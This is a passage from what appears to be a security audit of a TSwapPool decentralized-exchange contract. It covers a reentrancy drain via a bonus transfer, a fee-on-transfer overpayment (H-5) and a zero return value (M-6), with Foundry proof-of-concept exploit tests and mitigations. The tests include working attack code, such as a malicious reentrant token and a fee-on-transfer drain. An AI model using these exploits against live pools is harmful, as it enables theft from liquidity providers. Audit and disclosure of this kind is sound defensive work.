            pool.swapExactInput(IERC20(address(mal)), 1e9, IERC20(address(weth)), 1, uint64(block.timestamp));
        }
        vm.stopPrank();
    }

    function testReentrancy_via_bonus_drains_before_input_pulled() public {
        // Prepare: 9 small swaps to set swap_count to 9
        _smallWarmupSwaps(9);

        // Snapshot state before the 10th swap
        uint256 lpBalBefore = pool.balanceOf(address(mal));
        uint256 totalLpBefore = pool.totalLiquidityTokenSupply();
        uint256 poolWethBefore = weth.balanceOf(address(pool));
        uint256 tokenWethBefore = weth.balanceOf(address(mal));

        // Arm the malicious token so it reenters only on the next pool->transfer (the bonus)
        mal.arm();

        // 10th swap: attacker swaps tiny WETH for MAL; during bonus transfer, MAL reenters and withdraws its LP
        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        // input WETH tiny, output MAL minimal expectation
        pool.swapExactInput(IERC20(address(weth)), 1e9, IERC20(address(mal)), 1, uint64(block.timestamp));
        vm.stopPrank();

        // After attack completes
        uint256 tokenWethAfter = weth.balanceOf(address(mal));
        uint256 poolWethAfter = weth.balanceOf(address(pool));
        uint256 lpBalAfter = pool.balanceOf(address(mal));

        // Expected WETH drained equals pro-rata share withdrawn during reentrancy (computed from pre-swap reserves)
        // Note: withdraw uses current reserves before input is collected, exactly poolWethBefore here.
        uint256 expectedDrainedWeth = (lpBalBefore * poolWethBefore) / totalLpBefore;

        // Assert LP fully burned from malicious token during reentrancy
        assertEq(lpBalAfter, 0, "Malicious LP should be fully burned during reentrancy");

        // Assert the token contract received the drained WETH
        assertEq(tokenWethAfter - tokenWethBefore, expectedDrainedWeth, "Drained WETH mismatch");

        // The pool WETH should have decreased by drained amount, then slightly increased by the tiny swap input (1e9)
        // No WETH is sent out as part of this swap direction since output is MAL.
        uint256 expectedPoolWethAfter = poolWethBefore - expectedDrainedWeth + 1e9;
        assertEq(poolWethAfter, expectedPoolWethAfter, "Pool WETH reserves reflect reentrancy drain before input pull");

        // Strong signal of theft: drained WETH is massively larger than the WETH input of the triggering swap
        assertGt(expectedDrainedWeth, 1e18, "Drained WETH should be >> tiny input");
    }
}


## Suggested Mitigation
Fully eliminate the vulnerability by: 1) Reordering _swap to follow CEI strictly: compute output, then first pull input via inputToken.safeTransferFrom(msg.sender, address(this), inputAmount), then transfer the main output, and only after that handle the bonus transfer (or remove the bonus entirely). 2) Add a nonReentrant guard to all external entry points that interact with tokens: swapExactInput, swapExactOutput, withdraw, and deposit (so reentrancy from the bonus transfer cannot call withdraw). 3) In deposit, move LP minting after both asset transfers succeed (CEI), to avoid any reentrancy window leveraging pre-minted LP. 4) If the incentive is kept, consider a pull-based claimBonus() callable after a completed swap or constrained to a trusted token list, to avoid untrusted token callbacks during swap execution.





 **Derived From** : Swap overpays when input token is fee-on-transfer, draining pool reserves

## [H-5]. swapExactInput pays out based on nominal inputAmount instead of actual received, breaking x*y=k for fee-on-transfer tokens

## Derived From Pattern/Invariant
Swap overpays when input token is fee-on-transfer, draining pool reserves

## Exploit Type
AccountingInvariantViolation

## Location
TSwapPool.swapExactInput

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
TSwapPool.swapExactInput computes outputAmount using the user-supplied inputAmount and pre-swap reserves, then _swap() transfers inputAmount and unconditionally pays outputAmount. If inputToken is fee-on-transfer/deflationary, the pool actually receives fewer tokens than inputAmount, but still pays the larger outputAmount as if full input arrived. This violates the constant product invariant and lets traders extract value from pool reserves. Vulnerable flow: swapExactInput(...) { uint256 outputAmount = getOutputAmountBasedOnInput(inputAmount, inputReserves, outputReserves); _swap(inputToken, inputAmount, outputToken, outputAmount); } ... function _swap(...) { inputToken.safeTransferFrom(msg.sender, address(this), inputAmount); outputToken.safeTransfer(msg.sender, outputAmount); }

## Impact
Because swap output is computed from the nominal input instead of the actual amount received, any fee-on-transfer/deflationary input token allows traders to receive more output than justified by reserves, causing x*y to decrease. This affects both swapExactInput and swapExactOutput (pool pays fixed output even if it received less input due to transfer fees). Liquidity add paths are also vulnerable if they rely on user-stated amounts instead of balance deltas. Repeated exploitation can drain the scarce asset (e.g., WETH) from LPs. Severity: High.

## Command to Run Test
forge test --match-path test/H-swapExactInput-pays-.t.sol --match-test testSwapExactInput_FeeOnTransferOverpaysAndBreaksInvariant -vvv

## Proof of Concept
1) Create a pool where the pool token is fee-on-transfer (e.g., 10% burn/fee) and seed with WETH + pool tokens. 2) Attacker approves and calls swapExactInput(poolToken, X, WETH, 0, now). 3) Pool computes output based on X, but only receives 0.9X due to fee. 4) Pool pays out more WETH than justified by actual received input, reducing reserves and k. 5) Repeating drains WETH from LPs.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Simple mintable ERC20 used as WETH (no fee)
contract MintableERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Fee-on-transfer ERC20 with burn fee on every transfer/transferFrom
contract FeeOnTransferToken is ERC20 {
    uint256 public immutable feeBps; // e.g., 1000 = 10%
    constructor(string memory name_, string memory symbol_, uint256 _feeBps) ERC20(name_, symbol_) {
        feeBps = _feeBps;
    }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    // OZ v5 ERC20 uses _update hook for transfer/mint/burn
    function _update(address from, address to, uint256 value) internal override {
        if (from == address(0) || to == address(0) || feeBps == 0) {
            // mint or burn or zero fee
            super._update(from, to, value);
        } else {
            uint256 fee = (value * feeBps) / 10000;
            uint256 sendAmount = value - fee;
            // sendAmount goes to recipient
            super._update(from, to, sendAmount);
            if (fee > 0) {
                // burn the fee portion
                super._update(from, address(0), fee);
            }
        }
    }
}

contract SwapExactInputFeeOnTransferPoC is Test {
    MintableERC20 private weth;
    FeeOnTransferToken private fot; // pool token with transfer fee
    TSwapPool private pool;
    address private attacker = address(0x1234);

    function setUp() public {
        // Deploy tokens
        weth = new MintableERC20("Wrapped Ether", "WETH");
        fot = new FeeOnTransferToken("Fee Token", "FOT", 1000); // 10% fee on transfer

        // Deploy pool (pair: FOT/WETH)
        pool = new TSwapPool(address(fot), address(weth), "LP-Token", "LP");

        // Seed pool reserves directly by minting to the pool (no transfer -> no fee applied)
        weth.mint(address(pool), 1_000e18);
        fot.mint(address(pool), 1_000e18);

        // Fund attacker with FOT for swapping
        fot.mint(attacker, 100e18);

        // Approve pool to pull FOT from attacker
        vm.startPrank(attacker);
        fot.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function testSwapExactInput_FeeOnTransferOverpaysAndBreaksInvariant() public {
        // Snapshot pre-swap reserves
        uint256 fotResBefore = fot.balanceOf(address(pool));
        uint256 wethResBefore = weth.balanceOf(address(pool));
        uint256 kBefore = fotResBefore * wethResBefore;

        // Compute output based on NOMINAL input of 100 FOT (as the pool does)
        uint256 nominalInput = 100e18;
        uint256 expectedOutNominal = pool.getOutputAmountBasedOnInput(
            nominalInput,
            fotResBefore,
            wethResBefore
        );

        // Perform the swap: input = FOT (fee-on-transfer), output = WETH
        vm.startPrank(attacker);
        uint64 deadline = uint64(block.timestamp);
        pool.swapExactInput(fot, nominalInput, weth, 0, deadline);
        vm.stopPrank();

        // Snapshot post-swap reserves
        uint256 fotResAfter = fot.balanceOf(address(pool));
        uint256 wethResAfter = weth.balanceOf(address(pool));
        uint256 kAfter = fotResAfter * wethResAfter;

        // Deltas observed on pool reserves
        uint256 actualIn = fotResAfter - fotResBefore;        // how much pool actually received
        uint256 actualOut = wethResBefore - wethResAfter;      // how much pool actually paid out

        // 1) Because FOT is 10% fee-on-transfer, when attacker sends 100 FOT, pool receives only 90 FOT
        assertEq(actualIn, 90e18, "Pool should receive only 90 FOT due to 10% transfer fee");

        // 2) Pool still pays out based on NOMINAL input (100 FOT), not the actual received (90 FOT)
        assertEq(actualOut, expectedOutNominal, "Pool paid out using nominal input, not actual received");

        // 3) Constant-product invariant is broken (k decreased), demonstrating value leak
        assertLt(kAfter, kBefore, "k should decrease due to overpayment from fee-on-transfer input");

        // 4) For sanity, attacker WETH balance increased by the nominally computed amount
        uint256 attackerWeth = weth.balanceOf(attacker);
        assertEq(attackerWeth, expectedOutNominal, "Attacker received WETH based on nominal input amount");

        // 5) Show that if output were computed from actualIn (90 FOT), it would be strictly less
        uint256 correctOutFromActual = pool.getOutputAmountBasedOnInput(
            actualIn, // 90e18
            fotResBefore,
            wethResBefore
        );
        assertLt(correctOutFromActual, expectedOutNominal, "Correct output for actualIn should be less than nominal-based output");
    }
}


## Suggested Mitigation
Use balance-delta accounting everywhere tokens move so math uses amounts actually received/sent by the pool. For swaps: 1) swapExactInput: read pre-swap reserves, pull tokens first, compute actualIn = inputToken.balanceOf(this) - inputReserves, then compute output = getOutputAmountBasedOnInput(actualIn, inputReserves, outputReserves), enforce minOut, and transfer output. 2) swapExactOutput: compute a maximum acceptable input based on reserves, pull tokens, compute actualIn, recompute the output achievable from actualIn; if it is less than the requested exact output, either revert or keep pulling until satisfied (recommended: revert). For liquidity: 3) deposit: transfer both assets in first and compute received deltas; derive LP minted and the counterpart amount from those deltas; revert if the deltas do not match the required ratio. 4) withdraw: compute amounts, then transfer; for fee-on-transfer pool tokens when sending out, optionally overpay to match the computed amounts or revert if unsupported. If fee-on-transfer tokens are intentionally unsupported, enforce it explicitly by requiring balanceDelta == expected amount after transferFrom and reverting otherwise in both swap and deposit paths. This prevents invariant violations and reserve leakage.





 **Derived From** : swapExactInput returns 0 due to missing return assignment (broken integrations)

## [M-6]. TSwapPool.swapExactInput returns 0 instead of actual output, breaking routers and causing stuck/incorrectly forwarded proceeds

## Derived From Pattern/Invariant
swapExactInput returns 0 due to missing return assignment (broken integrations)

## Exploit Type
StandardViolation

## Location
TSwapPool.swapExactInput

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
swapExactInput computes outputAmount and performs the swap, but never assigns the return variable or returns outputAmount. Solidity defaults the return to 0, violating expected ERC-20/AMM router semantics. Integrations that forward based on the returned value will transfer 0 to users while holding the actual proceeds, or miscompute follow-on steps. Vulnerable snippet:

function swapExactInput(...) public ... returns (uint256 output) {
    ...
    uint256 outputAmount = getOutputAmountBasedOnInput(...);
    if (outputAmount < minOutputAmount) { revert TSwapPool__OutputTooLow(...); }
    _swap(inputToken, inputAmount, outputToken, outputAmount);
    // missing: return outputAmount; -> returns 0
}

## Impact
Users swapping via routers/integrations that rely on the function return receive 0 tokens while their input is spent; the router retains the actual output. Multi-hop routes can also revert due to using 0 as downstream input.

## Command to Run Test
forge test --match-path test/M-TSwapPool-swapExactI.t.sol --match-test testSwapExactInput_ReturnsZero_DirectCall -vvv

## Proof of Concept
1) LP seeds pool with WETH and Token.
2) User calls a Router that uses pool.swapExactInput(...) and forwards the returned amount to the user.
3) Because swapExactInput returns 0, the Router forwards 0 tokens to the user even though it received >0 from the pool; the Router keeps the output and the user loses the input.
4) This demonstrates a realistic broken integration and loss/stuck proceeds due to the StandardViolation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol"; // same IERC20 type as TSwapPool

contract BuggyRouter {
    function swapExactInputAndForward(
        TSwapPool pool,
        IERC20 inputToken,
        uint256 amountIn,
        IERC20 outputToken,
        uint256 minOut,
        address to
    ) external returns (uint256 out) {
        // Pull input from user
        require(inputToken.transferFrom(msg.sender, address(this), amountIn), "pull fail");
        // Approve pool to pull from router
        inputToken.approve(address(pool), amountIn);
        // Call pool; due to bug, this returns 0 even though output is sent to router
        out = pool.swapExactInput(inputToken, amountIn, outputToken, minOut, uint64(block.timestamp));
        // Forward what we think we got (0) -> user receives 0, router keeps actual proceeds
        require(outputToken.transfer(to, out), "forward fail");
    }
}

contract TSwap_SwapExactInput_ReturnsZero_PoC is Test {
    ERC20Mock internal weth;
    ERC20Mock internal token;
    PoolFactory internal factory;
    TSwapPool internal pool;
    BuggyRouter internal router;

    address internal lp = address(this); // liquidity provider is test contract itself
    address internal user;

    function setUp() public {
        // Deploy mocks and contracts
        weth = new ERC20Mock();
        token = new ERC20Mock();
        factory = new PoolFactory(address(weth));
        router = new BuggyRouter();

        // Create pool
        address poolAddr = factory.createPool(address(token));
        pool = TSwapPool(poolAddr);

        // Mint LP funds and approve pool
        token.mint(lp, 1_000_000 ether);
        weth.mint(lp, 1_000_000 ether);
        token.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);

        // Seed liquidity: 1000 token and 1000 WETH
        uint256 wethToDeposit = 1_000 ether;
        uint256 tokenToDeposit = 1_000 ether;
        pool.deposit(wethToDeposit, 0, tokenToDeposit, uint64(block.timestamp + 1));

        // Prepare user
        user = makeAddr("user");
        token.mint(user, 100 ether); // user will swap TOKEN -> WETH

        // Sanity: pool has reserves
        assertEq(token.balanceOf(address(pool)), tokenToDeposit);
        assertEq(weth.balanceOf(address(pool)), wethToDeposit);
    }

    // Demonstrates the core bug directly: swapExactInput returns 0 instead of actual output amount
    function testSwapExactInput_ReturnsZero_DirectCall() public {
        // Give test contract some TOKEN for direct swap
        token.mint(address(this), 1 ether);
        token.approve(address(pool), type(uint256).max);

        uint256 amountIn = 1 ether;
        uint256 inputReserves = token.balanceOf(address(pool));
        uint256 outputReserves = weth.balanceOf(address(pool));
        uint256 expectedOut = pool.getOutputAmountBasedOnInput(amountIn, inputReserves, outputReserves);
        assertGt(expectedOut, 0);

        uint256 wethBalanceBefore = weth.balanceOf(address(this));
        uint256 outReturned = pool.swapExactInput(IERC20(address(token)), amountIn, IERC20(address(weth)), expectedOut, uint64(block.timestamp + 1));

        // BUG: function returned 0
        assertEq(outReturned, 0, "swapExactInput should incorrectly return 0");

        // Yet we actually received the expected WETH proceeds
        uint256 received = weth.balanceOf(address(this)) - wethBalanceBefore;
        assertEq(received, expectedOut, "caller still receives WETH from pool");
    }

    // Demonstrates realistic integration breakage: router relies on return value and forwards 0 to user while keeping proceeds
    function testRouterKeepsProceedsWhenRelyingOnSwapReturn() public {
        uint256 amountIn = 10 ether;

        // Compute expectedOut based on current reserves
        uint256 inputReserves = token.balanceOf(address(pool));
        uint256 outputReserves = weth.balanceOf(address(pool));
        uint256 expectedOut = pool.getOutputAmountBasedOnInput(amountIn, inputReserves, outputReserves);
        assertGt(expectedOut, 0);

        // User approves router to spend TOKEN
        vm.startPrank(user);
        token.approve(address(router), amountIn);
        vm.stopPrank();

        uint256 userTokenBefore = token.balanceOf(user);
        uint256 userWethBefore = weth.balanceOf(user);
        uint256 routerWethBefore = weth.balanceOf(address(router));

        // User calls the router; router expects swapExactInput to return amountOut
        vm.prank(user);
        uint256 routerObservedOut = router.swapExactInputAndForward(
            pool,
            IERC20(address(token)),
            amountIn,
            IERC20(address(weth)),
            expectedOut, // exact minOut
            user
        );

        // Router thought it got 0 (due to pool bug)
        assertEq(routerObservedOut, 0, "router thinks it received 0 due to bad return value");

        // User spent input
        assertEq(userTokenBefore - token.balanceOf(user), amountIn, "user should have spent input tokens");
        // User received nothing forwarded by the router
        assertEq(weth.balanceOf(user) - userWethBefore, 0, "user should receive 0 because router forwarded 0");
        // Router actually holds the WETH proceeds from the pool
        assertEq(weth.balanceOf(address(router)) - routerWethBefore, expectedOut, "router keeps the actual proceeds");
    }
}


## Suggested Mitigation
Assign and return the computed amount: change swapExactInput(...) to set `output = outputAmount;` before returning, or explicitly `return outputAmount;`.



